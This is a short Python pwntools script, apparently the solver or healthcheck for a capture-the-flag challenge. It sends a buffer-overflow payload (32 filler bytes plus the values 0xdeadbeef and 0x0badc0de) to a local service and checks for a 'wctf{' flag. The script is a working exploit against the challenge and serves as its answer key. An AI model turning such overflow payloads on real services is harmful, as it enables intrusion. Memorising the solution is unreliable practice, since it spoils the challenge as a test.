#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

r = remote('127.0.0.1',1337)
payload = b'A'* 32 + p32(0xdeadbeef) + p32(0x0badc0de)
r.sendline(payload)

result = r.recvuntil(b'wctf{')
if b'wctf' in result:
    print(result)
    exit(0)
else:
    exit(1)
